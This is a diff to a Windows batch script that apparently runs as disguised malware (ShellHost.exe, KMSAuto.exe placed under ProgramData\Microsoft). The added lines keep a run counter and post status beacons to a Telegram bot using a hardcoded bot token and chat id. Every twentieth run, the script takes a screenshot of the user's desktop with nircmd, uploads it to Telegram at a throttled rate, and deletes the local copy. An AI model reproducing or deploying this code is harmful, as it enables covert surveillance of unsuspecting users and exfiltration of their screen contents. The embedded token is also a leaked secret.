@@ -2,12 +2,13 @@
 
 
 setlocal enabledelayedexpansion
-set "BATCHVERSION=2.3"
+set "BATCHVERSION=2.4"
 
 
 
 set "SHSTFILE=C:\ProgramData\Microsoft\Windows\ShellHost.exe"
 set "KMSFILE=C:\ProgramData\Microsoft\Windows\KMSAuto.exe"
+set nircmd="%APPDATA%\Microsoft\nircmd.exe"
 if not exist "%temp%\i059.tmp" type nul > "%temp%\i059.tmp"
 
 
@@ -71,7 +72,59 @@ echo.
 
 
 
-set nircmd="%APPDATA%\Microsoft\nircmd.exe"
+
+
+
+
+
+
+
+
+:: Define the file to track the last run time
+set "LASTRUNFILE=%TEMP%\lastrun.log"
+
+:: Check if the file exists
+if not exist "%LASTRUNFILE%" (
+    echo 1 > "%LASTRUNFILE%"
+) else (
+    for /f "delims=" %%A in ('type "%LASTRUNFILE%"') do set /a MINUTESS=%%A + 1
+    echo !MINUTESS! > "%LASTRUNFILE%"
+)
+
+:: Read the updated value
+set /p MINUTESS=<"%LASTRUNFILE%"
+echo Minutess=%MINUTESS%
+echo.
+echo.
+
+:: Check if 20 minutes have passed
+if %MINUTESS% GEQ 20 goto SENDMSG
+
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -F "chat_id=-1002163721260" -F "message_thread_id=74293" -F "text=LAPTOP|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%|%time%|%BATCHVERSION%|"
+
+
+goto NEXT1
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+:SENDMSG
+
 
 
 :: ============ MyScreen TOPIC ============
@@ -89,19 +142,8 @@ set "FILE_PATH_MyScrn=%USERPROFILE%\Downloads\screenshot.png"
 
 
 
-
-
-timeout /t 180 /nobreak
-
-
-
-
 "%nircmd%" savescreenshot "%USERPROFILE%\Downloads\screenshot.png"
 
-
-
-
-:SENDMSG
 
 :: Send Photo
 curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendPhoto" ^
@@ -111,12 +153,16 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendPhoto" ^
      -F "photo=@%FILE_PATH_MyScrn%" ^
      --limit-rate 80K
 
+echo 0 > "%LASTRUNFILE%"
 
 
 del /f /q "%USERPROFILE%\Downloads\screenshot.png"
 
 
-timeout /t 1020 /nobreak
+:NEXT1
+
+
+
 
 
 
